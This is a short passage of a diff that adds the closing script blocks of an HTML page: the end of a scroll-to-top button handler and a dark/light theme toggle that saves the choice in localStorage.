+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
